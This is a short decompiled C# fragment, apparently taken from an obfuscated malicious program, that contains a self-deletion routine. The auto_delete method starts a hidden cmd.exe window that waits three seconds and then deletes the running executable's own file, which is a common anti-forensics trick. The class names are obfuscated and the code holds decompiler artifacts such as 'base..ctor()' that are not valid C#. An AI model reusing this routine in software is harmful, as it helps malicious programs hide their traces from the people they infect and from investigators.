using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

// Token: 0x0200001B RID: 27
internal class Class15
{
	// Token: 0x06000059 RID: 89
	public static void auto_delete()
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
	}

	// Token: 0x0600005A RID: 90 RVA: 0x0000237E File Offset: 0x0000057E
	public Class15()
	{
		Class17.jLpoVv1z2TmaE();
		base..ctor();
	}
}
